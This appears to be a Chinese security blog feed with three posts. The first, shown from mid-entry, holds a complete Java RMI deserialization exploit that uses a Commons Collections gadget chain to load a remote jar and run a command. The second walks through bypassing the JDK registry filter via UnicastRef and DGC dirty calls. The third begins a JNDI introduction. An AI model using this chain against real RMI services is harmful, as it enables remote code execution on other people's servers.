<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Constructor&lt;?&gt; getFirstCtor(<span class="keyword">final</span> String name)</span><br><span class="line">            <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> Constructor&lt;?&gt; ctor = Class.forName(name).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> ctor;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">ip</span> <span class="operator">=</span> <span class="string">&quot;127.0.0.1&quot;</span>; <span class="comment">//注册中心ip</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">1099</span>; <span class="comment">//注册中心端口</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">remotejar</span> <span class="operator">=</span> 远程jar;</span><br><span class="line">        <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ANN_INV_HANDLER_CLASS</span> <span class="operator">=</span> <span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(java.net.URLClassLoader.class),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getConstructor&quot;</span>,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Class[].class &#125;,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; java.net.URL[].class &#125; &#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newInstance&quot;</span>,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object[].class &#125;,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                                            <span class="keyword">new</span> <span class="title class_">java</span>.net.URL[] &#123; <span class="keyword">new</span> <span class="title class_">java</span>.net.URL(remotejar) &#125;</span><br><span class="line">                                    &#125;</span><br><span class="line">                            &#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;loadClass&quot;</span>,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;ErrorBaseExec&quot;</span> &#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class, Class[].class &#125;,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;do_exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125; &#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class, Object[].class &#125;,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; command &#125; &#125;)</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="type">Transformer</span> <span class="variable">transformedChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">            <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line"> </span><br><span class="line">            <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>,</span><br><span class="line">                    transformedChain);</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> Class.forName(</span><br><span class="line">                    <span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">ctor</span> <span class="operator">=</span> cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">            ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line">            <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> ctor.newInstance(Target.class, outerMap);</span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(ip, port);</span><br><span class="line">            <span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) getFirstCtor(ANN_INV_HANDLER_CLASS)</span><br><span class="line">                    .newInstance(Target.class,</span><br><span class="line">                            outerMap);</span><br><span class="line">            <span class="type">Remote</span> <span class="variable">r</span> <span class="operator">=</span> Remote.class.cast(Proxy.newProxyInstance(</span><br><span class="line">                    Remote.class.getClassLoader(),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Remote.class &#125;, h));</span><br><span class="line">            registry.bind(<span class="string">&quot;liming&quot;</span>, r);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                System.out.print(e.getCause().getCause().getCause().getMessage());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception ee) &#123;</span><br><span class="line">                <span class="keyword">throw</span> e;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741254244223-c49e5c81-2bd4-4030-a9c8-0ac6be1164fe.png"></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>RMI</tag>
      </tags>
  </entry>
  <entry>
    <title>RMI之Java高版本绕过</title>
    <url>/2025/03/07/RMI%E4%B9%8BJava%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h1 id="y6jlj">RMI之Java高版本绕过</h1>
<h2 id="RoJuo">Java高版本限制</h2>
在Java高版本中，在`RegistryImpl`类中新加了一个`registryFilter`方法，里面对所传入的序列化对象的类型进行了限制

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (String.class == clazz</span><br><span class="line">                || java.lang.Number.class.isAssignableFrom(clazz)</span><br><span class="line">                || Remote.class.isAssignableFrom(clazz)</span><br><span class="line">                || java.lang.reflect.Proxy.class.isAssignableFrom(clazz)</span><br><span class="line">                || UnicastRef.class.isAssignableFrom(clazz)</span><br><span class="line">                || RMIClientSocketFactory.class.isAssignableFrom(clazz)</span><br><span class="line">                || RMIServerSocketFactory.class.isAssignableFrom(clazz)</span><br><span class="line">                || java.rmi.server.UID.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">            <span class="keyword">return</span> ObjectInputFilter.Status.ALLOWED;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> ObjectInputFilter.Status.REJECTED;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h2 id="tGZmh">绕过分析</h2>
<h3 id="i7igE">调用流程</h3>
其中有希望利用的只有`Proxy`和`UnicastRef`类，其中最重要的是`UnicastRef`类，在这个类中有一个`invoke`方法 ，在修复以后，客户端的被攻击点是没有被修复的，我们就想如果能让服务端去发送一个客户端请求，就会暴露出攻击点

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(RemoteCall var1)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            clientRefLog.log(Log.VERBOSE, <span class="string">&quot;execute call&quot;</span>);</span><br><span class="line">            var1.executeCall();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var3) &#123;</span><br><span class="line">            clientRefLog.log(Log.BRIEF, <span class="string">&quot;exception: &quot;</span>, var3);</span><br><span class="line">            <span class="built_in">this</span>.free(var1, <span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">throw</span> var3;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Error var4) &#123;</span><br><span class="line">            clientRefLog.log(Log.BRIEF, <span class="string">&quot;error: &quot;</span>, var4);</span><br><span class="line">            <span class="built_in">this</span>.free(var1, <span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">throw</span> var4;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException var5) &#123;</span><br><span class="line">            clientRefLog.log(Log.BRIEF, <span class="string">&quot;exception: &quot;</span>, var5);</span><br><span class="line">            <span class="built_in">this</span>.free(var1, <span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">throw</span> var5;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var6) &#123;</span><br><span class="line">            clientRefLog.log(Log.BRIEF, <span class="string">&quot;exception: &quot;</span>, var6);</span><br><span class="line">            <span class="built_in">this</span>.free(var1, <span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">throw</span> var6;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们的想法是找一个地方去调用<code>Util.createProxy</code>创建一个动态代理类，我们找到的是DGC这个类可以被利用，然后调用它的<code>clean</code>或者<code>dirty</code>方法去触发他的<code>invoke</code>方法</p>
<p>我们直接走向最终找到的<code>DGCClient</code>内部类的<code>EndpointEntry</code>的构造方法方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="title function_">EndpointEntry</span><span class="params">(<span class="keyword">final</span> Endpoint endpoint)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.endpoint = endpoint;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">LiveRef</span> <span class="variable">dgcRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LiveRef</span>(dgcID, endpoint, <span class="literal">false</span>);</span><br><span class="line">                dgc = (DGC) Util.createProxy(DGCImpl.class,</span><br><span class="line">                                             <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(dgcRef), <span class="literal">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;internal error creating DGC stub&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            renewCleanThread =  AccessController.doPrivileged(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">NewThreadAction</span>(<span class="keyword">new</span> <span class="title class_">RenewCleanThread</span>(),</span><br><span class="line">                                    <span class="string">&quot;RenewClean-&quot;</span> + endpoint, <span class="literal">true</span>));</span><br><span class="line">            renewCleanThread.start();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>接下来我们找哪里去创建了这么一个类，在<code>EndpointEntry</code>中的<code>lookup</code>方法中创建了这么一个类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> EndpointEntry <span class="title function_">lookup</span><span class="params">(Endpoint ep)</span> &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (endpointTable) &#123;</span><br><span class="line">                <span class="type">EndpointEntry</span> <span class="variable">entry</span> <span class="operator">=</span> endpointTable.get(ep);</span><br><span class="line">                <span class="keyword">if</span> (entry == <span class="literal">null</span>) &#123;</span><br><span class="line">                    entry = <span class="keyword">new</span> <span class="title class_">EndpointEntry</span>(ep);</span><br><span class="line">                    endpointTable.put(ep, entry);</span><br><span class="line">                    <span class="keyword">if</span> (gcLatencyRequest == <span class="literal">null</span>) &#123;</span><br><span class="line">                        gcLatencyRequest = GC.requestLatency(gcInterval);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> entry;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>我们看只有在<code>registerRefs</code>中调用了<code>EndpointEntry</code>的<code>lookup</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">registerRefs</span><span class="params">(Endpoint ep, List&lt;LiveRef&gt; refs)</span> &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Look up the given endpoint and register the refs with it.</span></span><br><span class="line"><span class="comment">         * The retrieved entry may get removed from the global endpoint</span></span><br><span class="line"><span class="comment">         * table before EndpointEntry.registerRefs() is able to acquire</span></span><br><span class="line"><span class="comment">         * its lock; in this event, it returns false, and we loop and</span></span><br><span class="line"><span class="comment">         * try again.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        EndpointEntry epEntry;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            epEntry = EndpointEntry.lookup(ep);</span><br><span class="line">        &#125; <span class="keyword">while</span> (!epEntry.registerRefs(refs));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们需要找到一个反序列化利用的点，再向上找，会找到两个调用<code>registerRefs</code>的方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735285463617-0b135f12-f4cb-4beb-ae5b-b34cccb701c5.png"></p>
<p>我们看<code>read</code>方法中，如果这个输入流不是并且不继承于<code>ConnectionInputStream</code>的话，就会调用我们的<code>registerRefs</code>方法，但是这个in是一个<code>ConnectionInputStream</code>，所以我们只能去找另一个方法去利用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (in <span class="keyword">instanceof</span> ConnectionInputStream) &#123;</span><br><span class="line">            <span class="type">ConnectionInputStream</span> <span class="variable">stream</span> <span class="operator">=</span> (ConnectionInputStream)in;</span><br><span class="line">            <span class="comment">// save ref to send &quot;dirty&quot; call after all args/returns</span></span><br><span class="line">            <span class="comment">// have been unmarshaled.</span></span><br><span class="line">            stream.saveRef(ref);</span><br><span class="line">            <span class="keyword">if</span> (isResultStream) &#123;</span><br><span class="line">                <span class="comment">// set flag in stream indicating that remote objects were</span></span><br><span class="line">                <span class="comment">// unmarshaled.  A DGC ack should be sent by the transport.</span></span><br><span class="line">                stream.setAckNeeded();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            DGCClient.registerRefs(ep, Arrays.asList(<span class="keyword">new</span> <span class="title class_">LiveRef</span>[] &#123; ref &#125;));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>另一个最终的流程是<code>releaseInputStream</code>去调用<code>StreamRemoteCall.registerRefs</code>然后进入到if中（这个判断条件中的incomingRefTable是为空的，我们后续会说怎么走到if里面）调用<code>DGCClient.registerRefs</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">releaseInputStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (in != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    in.done();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (RuntimeException e) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">                in.registerRefs();</span><br><span class="line">                in.done(conn);</span><br><span class="line">            &#125;</span><br><span class="line">            conn.releaseInputStream();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            in = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">registerRefs</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!incomingRefTable.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">for</span> (Map.Entry&lt;Endpoint, List&lt;LiveRef&gt;&gt; entry :</span><br><span class="line">                     incomingRefTable.entrySet()) &#123;</span><br><span class="line">                DGCClient.registerRefs(entry.getKey(), entry.getValue());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>最后调用<code>releaseInputStream</code>的地方就是非常的多了，在许多Skel中都有调用</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735286130718-449e3a84-5bfa-4b08-84a0-611bf046ed26.png"></p>
<p>最后的流程如下，只要调用<code>releaseInputStream</code>，就会创建一个<code>proxy</code>对象</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735286703216-1104471b-868f-418d-b2a7-0abdf6e93cbf.png"></p>
<h3 id="Uf1hj">incomingRefTable赋值</h3>
**实际上反序列化流程，只是为了给incomingRefTable赋值，攻击流程实际是在正常的调用流程中**

<p>我们上面说过，这里的值默认是空的，要想走入<code>DGCClient.registerRefs</code>中，我们就应该去找，哪里给incomingRefTable赋值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">registerRefs</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!incomingRefTable.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">for</span> (Map.Entry&lt;Endpoint, List&lt;LiveRef&gt;&gt; entry :</span><br><span class="line">                     incomingRefTable.entrySet()) &#123;</span><br><span class="line">                DGCClient.registerRefs(entry.getKey(), entry.getValue());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>实际这里只有一个地方<code>ConnectionInputStream</code>的<code>saveRef</code>中，向里面put进去了一个东西，使他不为空</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">saveRef</span><span class="params">(LiveRef ref)</span> &#123;</span><br><span class="line"><span class="type">Endpoint</span> <span class="variable">ep</span> <span class="operator">=</span> ref.getEndpoint();</span><br><span class="line"></span><br><span class="line"><span class="comment">// check whether endpoint is already in the hashtable</span></span><br><span class="line">List&lt;LiveRef&gt; refList = incomingRefTable.get(ep);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (refList == <span class="literal">null</span>) &#123;</span><br><span class="line">    refList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;LiveRef&gt;();</span><br><span class="line">    incomingRefTable.put(ep, refList);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// add ref to list of refs for endpoint ep</span></span><br><span class="line">refList.add(ref);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>saveRef</code>也是只有一个地方去调用，就是<code>read</code>方法，我们之前讨论过</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> LiveRef <span class="title function_">read</span><span class="params">(ObjectInput in, <span class="type">boolean</span> useNewFormat)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        ......</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in <span class="keyword">instanceof</span> ConnectionInputStream) &#123;</span><br><span class="line">            <span class="type">ConnectionInputStream</span> <span class="variable">stream</span> <span class="operator">=</span> (ConnectionInputStream)in;</span><br><span class="line">            <span class="comment">// save ref to send &quot;dirty&quot; call after all args/returns</span></span><br><span class="line">            <span class="comment">// have been unmarshaled.</span></span><br><span class="line">            stream.saveRef(ref);</span><br><span class="line">            <span class="keyword">if</span> (isResultStream) &#123;</span><br><span class="line">                <span class="comment">// set flag in stream indicating that remote objects were</span></span><br><span class="line">                <span class="comment">// unmarshaled.  A DGC ack should be sent by the transport.</span></span><br><span class="line">                stream.setAckNeeded();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            DGCClient.registerRefs(ep, Arrays.asList(<span class="keyword">new</span> <span class="title class_">LiveRef</span>[] &#123; ref &#125;));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ref;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们看看谁调用了<code>read</code>方法，只有<code>UnicastRef</code>和<code>UnicastRef2</code>中的<code>readExternal</code>去调用了<code>read</code>方法</p>
<p><code>readExternal</code>是一个和<code>readObject</code>类似但不一样的东西，如果所反序列化的类，也有<code>readExternal</code>方法，也会去调用<code>readExternal</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput in)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        ref = LiveRef.read(in, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>UnicastRef</code>是白名单里面的内容，我们向客户端传入一个<code>UnicastRef</code>对象触发它的<code>readexternal</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="built_in">this</span>.ref = LiveRef.read(var1, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>进入到<code>LiveRef.read</code>中… 剩下的调用我们就不再重复</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> LiveRef <span class="title function_">read</span><span class="params">(ObjectInput var0, <span class="type">boolean</span> var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        ......</span><br><span class="line">        <span class="keyword">if</span> (var0 <span class="keyword">instanceof</span> ConnectionInputStream) &#123;</span><br><span class="line">            <span class="type">ConnectionInputStream</span> <span class="variable">var6</span> <span class="operator">=</span> (ConnectionInputStream)var0;</span><br><span class="line">            var6.saveRef(var5);</span><br><span class="line">            <span class="keyword">if</span> (var4) &#123;</span><br><span class="line">                var6.setAckNeeded();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            DGCClient.registerRefs(var2, Arrays.asList(var5));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> var5;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>后续会走到<code>EndpointEntry</code>中，在创建完dgc后会走到下面创建一个<code>RenewCleanThread</code>线程</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="title function_">EndpointEntry</span><span class="params">(Endpoint var1)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.endpoint = var1;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">LiveRef</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LiveRef</span>(DGCClient.dgcID, var1, <span class="literal">false</span>);</span><br><span class="line">                <span class="built_in">this</span>.dgc = (DGC)Util.createProxy(DGCImpl.class, <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(var2), <span class="literal">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (RemoteException var3) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;internal error creating DGC stub&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">this</span>.renewCleanThread = (Thread)AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">NewThreadAction</span>(<span class="keyword">new</span> <span class="title class_">RenewCleanThread</span>(), <span class="string">&quot;RenewClean-&quot;</span> + var1, <span class="literal">true</span>));</span><br><span class="line">            <span class="built_in">this</span>.renewCleanThread.start();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p><code>RenewCleanThread</code>中，会调用<code>DGCClient</code>的<code>makeDirtyCall</code>方法，而这个方法最终会调用他的<code>dirty</code>方法，就会调用到<code>invoke</code>方法，最终让服务器发送客户端请求</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Void&gt;() &#123;</span><br><span class="line">                        <span class="keyword">public</span> Void <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                            <span class="keyword">if</span> (var4) &#123;</span><br><span class="line">                                EndpointEntry.<span class="built_in">this</span>.makeDirtyCall(var5, var6);</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> (!EndpointEntry.<span class="built_in">this</span>.pendingCleans.isEmpty()) &#123;</span><br><span class="line">                                EndpointEntry.<span class="built_in">this</span>.makeCleanCalls();</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>RMI</tag>
      </tags>
  </entry>
  <entry>
    <title>JNDI专题</title>
    <url>/2025/03/08/JNDI%E4%B8%93%E9%A2%98/</url>
    <content><![CDATA[<h1 id="f9scM">JNDI专题</h1>
<h2 id="LdYqz">简介</h2>
<h3 id="XvDGy">JNDI是什么</h3>
**JNDI(Java Naming and Directory Interface,Java命名和目录接口)**是SUN公司提供的一种标准的Java命名系统接口，JNDI提供统一的客户端API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。

<p>简单来说就是一个索引库，将一个名称对应到一个对象（或者属性）上面，并且可以通过指定名称找到相应对象</p>
<p><strong>作用：可以实现动态加载数据库配置文件，从而保持数据库代码不变动等</strong></p>
<h3 id="hMIZu">结构</h3>
JDNI包含在JavaSE平台中。要使用JNDI，必须拥有JNDI类和一个或者多个服务器提供者。JDK包括以下命名/目录服务的提供者：

<ul>
<li>轻量级目录访问协议（LDAP）</li>
<li>通过对象请求代理架构（CORBA）通过对象服务（COS）名称服务</li>
<li>Java远程方法调用（RMI）注册表</li>
<li>域名服务（DNS）</li>
</ul>
<p>在JavaJDK中提供了5个包，有以下几个</p>
